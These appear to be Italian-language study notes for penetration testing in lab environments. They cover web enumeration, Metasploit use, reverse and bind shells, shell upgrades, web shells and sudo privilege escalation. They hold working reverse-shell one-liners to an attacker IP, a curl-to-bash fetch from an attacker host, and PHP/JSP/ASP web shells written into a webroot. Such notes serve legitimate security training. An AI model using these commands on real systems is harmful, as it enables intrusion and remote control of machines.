# Shell & Post-Exploitation

---

## Web Enumeration Tips

### Banner Grabbing / Web Server Headers

Usare cURL per leggere gli header HTTP e scoprire info sul server:

```bash
curl -IL https://www.inlanefreight.com
```

**Cosa cerchiamo:**

| Header | Cosa rivela |
|--------|-------------|
| `Server:` | Versione esatta (es. Apache 2.4.41) |
| `X-Powered-By:` | Linguaggi e versioni (es. PHP/7.4.12) |
| `Set-Cookie:` | Framework in uso (es. `PHPSESSID` = PHP) |

### EyeWitness

Strumento fondamentale nella fase di ricognizione, soprattutto con molti target:

- Controlla automaticamente i server web trovati
- Fa screenshot automatici per una galleria visiva dei target
- Analizza pagine e header per capire cosa gira sul server
- Identifica credenziali di default su interfacce note

```bash
eyewitness --web -f urls.txt -d /home/user/report_web
```

### WhatWeb

Identifica le tecnologie web (CMS, librerie JS, webserver, framework, dispositivi):

```bash
whatweb --no-errors 10.10.10.0/24
```

### Certificati SSL/TLS

Il certificato puo nascondere info non visibili sulla pagina:

- Indirizzi mail degli admin
- Nomi di sottodomini alternativi
- Nomi reali della societa (utile per spear phishing)

### robots.txt

Serve ai motori di ricerca per nascondere pagine dai risultati, ma per noi e una **mappa del tesoro** (vedi `notes info-gathering`).

---

## Exploit

### Searchsploit

Cerca vulnerabilita pubbliche ed exploit per qualsiasi applicazione:

```bash
# Installazione
sudo apt install exploitdb -y

# Uso
searchsploit openssh 7.2
```

### Metasploit

```bash
msfconsole

# Cercare un exploit
search exploit eternalblue

# Selezionare un exploit
use exploit/windows/smb/ms17_010_psexec

# Vedere le opzioni (Required = yes -> obbligatorie)
show options

# Configurare
set RHOSTS 10.10.10.40
set FILEPATH /flag.txt
set RPORT 30292

# Verificare se il target e vulnerabile
check

# Lanciare l exploit
run
# oppure
exploit
```

---

## Tipi di Shell

Una volta compromesso un sistema serve un metodo di comunicazione persistente. Per connettersi da remoto si usa **SSH** (Linux) o **WinRM** (Windows), ma solo con le credenziali. Altrimenti: **shell**.

---

### Reverse Shell

Il target inizia una connessione verso l attaccante. Metodo piu veloce, bypassa i firewall.

**Sul tuo PC (attaccante) -- mettiti in ascolto:**

```bash
nc -lvnp 1234
```

| Flag | Significato |
|------|-------------|
| `-l` | Listen (ascolta) |
| `-v` | Verbose (piu dettagli) |
| `-n` | Numeric only (no DNS, piu veloce) |
| `-p` | Porta |

**Sul PC della vittima -- connettiti all attaccante:**

```bash
# Metodo 1: bash diretto
bash -c 'bash -i >& /dev/tcp/TUO_IP/1234 0>&1'

# Metodo 2: con mkfifo
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

---

### Bind Shell

La vittima apre una porta e aspetta che l attaccante si connetta.

**Sul PC della vittima -- apri la porta:**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

**Sul PC dell attaccante -- connettiti:**

```bash
nc IP_VITTIMA 1234
```

---

### Migliorare la TTY (upgrade shell)

Le shell ottenute con netcat sono "stupide" (niente frecce, niente tab, Ctrl+C chiude tutto).

**Problema:** Senza un vero terminale TTY, non funzionano: frecce, Tab, Ctrl+C (uccide la connessione), `vim`, `nano`, `sudo`, `su`, `ssh` interattivo.

#### Metodo classico (Python + stty)

```bash
# 1. Spawna una bash vera con Python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Premi Ctrl+Z (mette la shell in background)

# 3. Sul TUO terminale:
stty raw -echo; fg
# Premi Invio 2 volte

# 4. Nella shell della vittima, imposta dimensioni:
export TERM=xterm-256color
stty rows 40 columns 120
```

Per conoscere le dimensioni del tuo terminale: `echo $TERM` e `stty size`

#### Tutti i metodi per spawnare una shell interattiva

Se Python non è disponibile, esistono molte alternative:

| Metodo | Comando |
|--------|---------|
| **Python3** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| **Python2** | `python -c 'import pty; pty.spawn("/bin/bash")'` |
| **script** | `script -qc /bin/bash /dev/null` |
| **Perl** | `perl -e 'exec "/bin/sh";'` |
| **Ruby** | `ruby -e 'exec "/bin/sh"'` |
| **Lua** | `lua -e 'os.execute("/bin/sh")'` |
| **AWK** | `awk 'BEGIN {system("/bin/sh")}'` |
| **Find** | `find . -exec /bin/sh \; -quit` |
| **VIM** | `vim -c ':!/bin/sh'` |
| **expect** | `expect -c 'spawn /bin/bash; interact'` |
| **/bin/sh -i** | `/bin/sh -i` |

> **Nota:** Questi metodi spawnano una shell ma non configurano il terminale. Dopo lo spawn, esegui comunque il passaggio Ctrl+Z + `stty raw -echo; fg` per avere frecce, Tab e history funzionanti.

#### Upgrade automatico con SeaLion

Se hai il server SeaLion attivo, puoi upgradare in un comando:

```bash
# Upgrade in-place (lavora sulla shell corrente, no nuove connessioni)
curl http://<LHOST>:2727/upgrade2 | bash

# Upgrade con nuova connessione socat (TTY piena)
# Prerequisito: socat file:$(tty),raw,echo=0 tcp-listen:4444
curl http://<LHOST>:2727/upgrade | bash
```

#### Verifica dei permessi dopo l'upgrade

Una volta ottenuta una shell stabile, verificare subito il contesto di sicurezza:

```bash
# Cosa posso eseguire con sudo?
sudo -l
```

Esempio di output favorevole:

```
User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```

Se l'utente ha `NOPASSWD: ALL`, si ha accesso root immediato con `sudo su -`.

> **Nota:** `sudo -l` richiede un terminale TTY funzionante — ecco perché fare l'upgrade della shell è il primo passo dopo aver ottenuto accesso.

---

### Web Shell

Script (PHP/JSP/ASP) che accetta comandi via parametri HTTP e mostra l output nella pagina.

**Esempi di web shell one-liner:**

PHP:
```
<?php system($_REQUEST["cmd"]); ?>
```

JSP:
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

ASP:
```
<% eval request("cmd") %>
```

**Webroot di default:**

| Server | Path |
|--------|------|
| Apache | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html/` |
| IIS | `c:\inetpub\wwwroot\` |
| XAMPP | `C:\xampp\htdocs\` |

**Uso pratico (Apache + PHP):**

```bash
# Scrivi la web shell nella webroot
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

Poi accedi da browser:

```
http://TARGET/shell.php?cmd=id
http://TARGET/shell.php?cmd=whoami
http://TARGET/shell.php?cmd=cat /etc/passwd
```

---

## Privilege Escalation

### LinPEAS / WinPEAS

**PEAS** = Privilege Escalation Awesome Script Suite

Cercano automaticamente password salvate, permessi errati e vulnerabilita del SO.

```bash
./linpeas.sh
```

Questi script potrebbero triggerare antivirus o EDR -- a volte e meglio fare l enumerazione manualmente.

---

### Kernel Exploits

Se l SO e vecchio il kernel potrebbe avere difetti di fabbrica sfruttabili.

**Attenzione:** Se l exploit del kernel fallisce potrebbe causare BSOD (Windows) o kernel panic (Linux), crashando l intero server.

---

### User Privileges (sudo)

`sudo` permette a un utente di eseguire comandi come un utente diverso (tipicamente root).

```bash
# Vedere cosa puoi fare con sudo
sudo -l
```

**Caso 1: Accesso completo**

Se vedi `(ALL : ALL) ALL`:

```bash
sudo su -
# Ti chiede la TUA password, poi apre una shell root
```

**Caso 2: Comando specifico senza password**

Se vedi `(user : user) NOPASSWD: /bin/echo`:

```bash
sudo -u user /bin/echo Hello World!
```

### GTFOBins / LOLBAS

- **GTFOBins** (Linux): lista di comandi Unix e come sfruttarli per escalation tramite sudo
  - https://gtfobins.github.io/
- **LOLBAS** (Windows): equivalente per binari Windows
  - https://lolbas-project.github.io/

Se scopri che puoi usare un comando con privilegi elevati, cerca su GTFOBins come sfruttarlo per ottenere una shell root.